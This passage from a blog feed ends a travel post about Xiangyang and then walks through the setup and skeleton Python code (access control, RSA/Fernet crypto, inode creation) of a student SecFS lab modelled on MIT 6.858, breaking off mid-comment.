城"></p><p>中午了，嗦一碗襄阳牛肉粉</p><p><img src="http://cdn.lmark.cc/img/image-20230730235345082.png" alt="image-20230730235345082" title="辣死了"></p><p>愉快的襄阳古城行结束了，下午，我们去了唐城一趟，没想到被坑惨了。</p><h2 id="封笔"><a href="#封笔" class="headerlink" title="封笔"></a>封笔</h2><p>不写了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 旅行 </tag>
            
            <tag> 武汉 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>计算机系统工程SecFs实验一</title>
      
      <link href="/archives/cc742ad6.html"/>
      <url>/archives/cc742ad6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个学期（大二下）我在郝xd的撺掇下，选了曲老师的《计算机系统工程》这门课。对标的是MIT的6.033课程，参考内容目录<a href="https://blog.miigon.net/posts/mit6033-computer-system-design/">MIT6.033 Computer System Design | 计算机系统设计 | Miigon’s blog</a><br>这门课在国内各大高校同类型的课基本找不到(可能不叫这个名字吧)，就连这本课本的中译版正版都很难找到(我只买到了盗版)。就是这么一门神秘的课程，却讲了许多计算机系统设计的基本原则，可谓是干货满满。用曲老师的话来说:这门课可能是大学四年中，计算机专业最实用的课。在上了半个学期后，我是深深体会到了。故想写一篇博客记录一下这节课的实验课，以及自己的一些想法。</p><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>世界正在慢慢变得更加紧密，并且越来越需要让你的所有数据都具有可用性、可共享性、安全性和可 复制性，由于这些需求，Dropbox 和 Google Drive 等云服务应运而生，并取得了巨大成功。他们获取你的 文件并将它们透明地托管在“云”中。但是，用户在此过程中失去了对数据的一些控制。你必须信任公司 能够保证数据安全；你必须相信他们不会查看你的数据，不会共享它，也不会丢失它。在本实验中，要求 开发一个文件系统，这个系统允许用户将数据存储在远程文件服务器上，但是用户无需信任该服务器。</p><h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>本实验的目的是让你了解如何构建安全、相对复杂且有用的软件。你将构建一个远程文件系统 SecFS， 它在面对完全不受信任的服务器时能提供机密性和完整性。 我们为你提供了一个具有很少功能和更少安全保证的框架为基础进行本实验。你需要扩展这些功能来 实现线面的实验目标。我们提供的代码是 SUNDR 序列化版本的一部分。你应该阅读论文 SUNDR ，因为本 实验中的许多概念和原理与之相似。为了完成本实验，你需要实现其余部分以支持整个序列化 SUNDR，并 添加机密性保证（文件的读取保护）。</p><p>实验官网：<a href="https://css.csail.mit.edu/6.858/2020/labs/lab5-2020.html">6.858 Spring 2020 Final assignment (mit.edu)</a></p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>本实验需要python3环境，这还是有点坑爹的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y python3-venv libfuse-dev python3-dev</span><br></pre></td></tr></table></figure><p>然后克隆SecFS文件系统的仓库，并安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mit-pdos/secfs-skeleton.git secfs</span><br><span class="line">cd secfs</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>出现以下提示即说明安装成功，之后只需要使用start.sh即可启动文件系统</p><p><img src="https://cdn.lmark.cc/img/image-20230414103810394.png"></p><h3 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h3><p><img src="https://cdn.lmark.cc/img/image-20230414111518317.png"></p><p><img src="https://cdn.lmark.cc/img/image-20230414111557373.png"></p><h3 id="代码预览"><a href="#代码预览" class="headerlink" title="代码预览"></a>代码预览</h3><h4 id="secfs-access-py"><a href="#secfs-access-py" class="headerlink" title=".&#x2F;secfs&#x2F;access.py"></a>.&#x2F;secfs&#x2F;access.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secfs.fs</span><br><span class="line"><span class="keyword">from</span> secfs.types <span class="keyword">import</span> I, Principal, User, Group</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">can_read</span>(<span class="params">user, i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    如果给定user可以读取给定的i，则返回True。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">can_write</span>(<span class="params">user, i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    如果给定user可以修改给定的i，则返回True。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(user, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, <span class="built_in">type</span>(user)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果i属于某个user，而这个user不是你，你就不能写入</span></span><br><span class="line">    <span class="keyword">if</span> i.p.is_user() <span class="keyword">and</span> i.p != user:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果一个group拥有i，而你不在这个group中，你就不能写入</span></span><br><span class="line">    <span class="keyword">if</span> i.p.is_group() <span class="keyword">and</span> (i.p <span class="keyword">not</span> <span class="keyword">in</span> secfs.fs.groupmap <span class="keyword">or</span> user <span class="keyword">not</span> <span class="keyword">in</span> secfs.fs.groupmap[i.p]):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">can_execute</span>(<span class="params">user, i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    如果给定user可以执行给定的i，则返回True。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(user, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, <span class="built_in">type</span>(user)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> secfs.access.can_read(user, i):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 校验x位</span></span><br><span class="line">    node = secfs.fs.get_inode(i)</span><br><span class="line">    <span class="keyword">return</span> node.ex</span><br></pre></td></tr></table></figure><h4 id="secfs-crypto-py"><a href="#secfs-crypto-py" class="headerlink" title=".&#x2F;secfs&#x2F;crypto.py"></a>.&#x2F;secfs&#x2F;crypto.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该文件实现了SecFS的加密部分</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> secfs.types <span class="keyword">import</span> I, Principal, User, Group</span><br><span class="line"></span><br><span class="line">keys = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_keyfile</span>(<span class="params">user, f</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    为给定user注册私钥，用于签名/解密。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(user, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, <span class="built_in">type</span>(user)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">        k=key_file.read()</span><br><span class="line">        keys[user] = serialization.load_pem_private_key(</span><br><span class="line">            k,</span><br><span class="line">            password=<span class="literal">None</span>,</span><br><span class="line">            backend=default_backend()</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_sym</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用给定的密钥解密给定的数据。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    f = Fernet(key)</span><br><span class="line">    <span class="keyword">return</span> f.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_sym</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用给定的密钥加密给定的数据。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    f = Fernet(key)</span><br><span class="line">    <span class="keyword">return</span> f.encrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">user</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    确保私钥/公钥存在于指定user的user-$uid-key.pem中，如果没有，请创建一个，并将私钥存储在磁盘上。</span></span><br><span class="line"><span class="string">    最终，返回user的pem编码公钥。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(user, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, <span class="built_in">type</span>(user)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line">    f = <span class="string">&quot;user-&#123;&#125;-key.pem&quot;</span>.<span class="built_in">format</span>(user.<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os.path</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(f):</span><br><span class="line">        private_key = rsa.generate_private_key(</span><br><span class="line">            public_exponent=<span class="number">65537</span>,</span><br><span class="line">            key_size=<span class="number">2048</span>,</span><br><span class="line">            backend=default_backend()</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        pem = private_key.private_bytes(</span><br><span class="line">           encoding=serialization.Encoding.PEM,</span><br><span class="line">           <span class="built_in">format</span>=serialization.PrivateFormat.TraditionalOpenSSL,</span><br><span class="line">           encryption_algorithm=serialization.NoEncryption()</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">            key_file.write(pem)</span><br><span class="line"></span><br><span class="line">        public_key = private_key.public_key()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">            public_key = serialization.load_pem_private_key(</span><br><span class="line">                key_file.read(),</span><br><span class="line">                password=<span class="literal">None</span>,</span><br><span class="line">                backend=default_backend()</span><br><span class="line">            ).public_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> public_key.public_bytes(</span><br><span class="line">       encoding=serialization.Encoding.PEM,</span><br><span class="line">       <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h4 id="secfs-fs-py"><a href="#secfs-fs-py" class="headerlink" title=".&#x2F;secfs&#x2F;fs.py"></a>.&#x2F;secfs&#x2F;fs.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该文件实现了inode级别的文件系统操作。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> secfs.crypto</span><br><span class="line"><span class="keyword">import</span> secfs.tables</span><br><span class="line"><span class="keyword">import</span> secfs.access</span><br><span class="line"><span class="keyword">import</span> secfs.store.tree</span><br><span class="line"><span class="keyword">import</span> secfs.store.block</span><br><span class="line"><span class="keyword">from</span> secfs.store.inode <span class="keyword">import</span> Inode</span><br><span class="line"><span class="keyword">from</span> secfs.store.tree <span class="keyword">import</span> Directory</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> secfs.types <span class="keyword">import</span> I, Principal, User, Group</span><br><span class="line"></span><br><span class="line"><span class="comment"># usermap包含一个从user ID到根据/.users对应的公钥的映射</span></span><br><span class="line">usermap = &#123;&#125;</span><br><span class="line"><span class="comment"># groupmap包含一个从group ID到/.groups的成员列表的映射</span></span><br><span class="line">groupmap = &#123;&#125;</span><br><span class="line"><span class="comment"># owner 是拥有当前共享的user主体</span></span><br><span class="line">owner = <span class="literal">None</span></span><br><span class="line"><span class="comment"># root_i 是当前共享root节点的i</span></span><br><span class="line">root_i = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_inode</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据inode的i获取inode的快捷方式。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ihash = secfs.tables.resolve(i)</span><br><span class="line">    <span class="keyword">if</span> ihash == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> LookupError(<span class="string">&quot;asked to resolve i &#123;&#125;, but i does not exist&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Inode.load(ihash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">owner, users, groups</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Init将初始化一个新的共享root作为给定的user主体。这包括在根目录中添加.和..。.users和.groups文件，分别列出可信user公钥和group成员。这个函数只会分配共享的根目录，但不会将它映射到服务器上的任何特定共享。新root节点的i会被返回，这样调用者就可以完成这项工作。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(owner, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(owner, <span class="built_in">type</span>(owner)))</span><br><span class="line"></span><br><span class="line">    node = Inode()</span><br><span class="line">    node.kind = <span class="number">0</span></span><br><span class="line">    node.ex = <span class="literal">True</span></span><br><span class="line">    node.ctime = time.time()</span><br><span class="line">    node.mtime = node.ctime</span><br><span class="line"></span><br><span class="line">    ihash = secfs.store.block.store(node.<span class="built_in">bytes</span>())</span><br><span class="line">    root_i = secfs.tables.modmap(owner, I(owner), ihash)</span><br><span class="line">    <span class="keyword">if</span> root_i == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError</span><br><span class="line"></span><br><span class="line">    new_ihash = secfs.store.tree.add(root_i, <span class="string">b&#x27;.&#x27;</span>, root_i)</span><br><span class="line">    secfs.tables.modmap(owner, root_i, new_ihash)</span><br><span class="line">    new_ihash = secfs.store.tree.add(root_i, <span class="string">b&#x27;..&#x27;</span>, root_i)</span><br><span class="line">    secfs.tables.modmap(owner, root_i, new_ihash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CREATED ROOT AT&quot;</span>, new_ihash)</span><br><span class="line"></span><br><span class="line">    init = &#123;</span><br><span class="line">        <span class="string">b&quot;.users&quot;</span>: users,</span><br><span class="line">        <span class="string">b&quot;.groups&quot;</span>: groups,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    <span class="keyword">for</span> fn, c <span class="keyword">in</span> init.items():</span><br><span class="line">        bts = pickle.dumps(c)</span><br><span class="line"></span><br><span class="line">        node = Inode()</span><br><span class="line">        node.kind = <span class="number">1</span></span><br><span class="line">        node.size = <span class="built_in">len</span>(bts)</span><br><span class="line">        node.mtime = node.ctime</span><br><span class="line">        node.ctime = time.time()</span><br><span class="line">        node.blocks = [secfs.store.block.store(bts)]</span><br><span class="line"></span><br><span class="line">        ihash = secfs.store.block.store(node.<span class="built_in">bytes</span>())</span><br><span class="line">        i = secfs.tables.modmap(owner, I(owner), ihash)</span><br><span class="line">        link(owner, i, root_i, fn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root_i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_create</span>(<span class="params">parent_i, name, create_as, create_for, isdir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    _create分配一个新文件，并将其链接到指定名称的目录parent_i中。新文件由create_for拥有，但使用create_as的凭据创建。这种区别是必要的，因为在作为group创建文件时，最后的i需要user主体。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(parent_i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(parent_i, <span class="built_in">type</span>(parent_i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(create_as, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(create_as, <span class="built_in">type</span>(create_as)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(create_for, Principal):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a Principal, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(create_for, <span class="built_in">type</span>(create_for)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> create_as.is_user() <span class="comment"># 仅users可创建</span></span><br><span class="line">    <span class="keyword">assert</span> create_as == create_for <span class="keyword">or</span> create_for.is_group() <span class="comment"># 为你自己或group创建</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> create_for.is_group() <span class="keyword">and</span> create_for <span class="keyword">not</span> <span class="keyword">in</span> groupmap:</span><br><span class="line">        <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot create for unknown group &#123;&#125;&quot;</span>.<span class="built_in">format</span>(create_for))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 该检查由下面的link()执行，但最好能尽快失败</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> secfs.access.can_write(create_as, parent_i):</span><br><span class="line">        <span class="keyword">if</span> parent_i.p.is_group():</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot create in group-writeable directory &#123;0&#125; as &#123;1&#125;; user is not in group&quot;</span>.<span class="built_in">format</span>(parent_i, create_as))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot create in user-writeable directory &#123;0&#125; as &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(parent_i, create_as))</span><br><span class="line"></span><br><span class="line">    node = Inode()</span><br><span class="line">    node.ctime = time.time()</span><br><span class="line">    node.mtime = node.ctime</span><br><span class="line">    node.kind = <span class="number">0</span> <span class="keyword">if</span> isdir <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    node.ex = isdir</span><br><span class="line"></span><br><span class="line">    <span class="comment"># FIXME</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 在这里，你需要：</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># - 在服务器上存储新创建的 inode (node.bytes())</span></span><br><span class="line">    <span class="comment"># - 将该块映射到user拥有的 i</span></span><br><span class="line">    <span class="comment"># - 如果创建目录，则为之创建条目.和 ..</span></span><br><span class="line">    <span class="comment"># - 如果 create_for 是一个group，您还必须为该group创建一个group 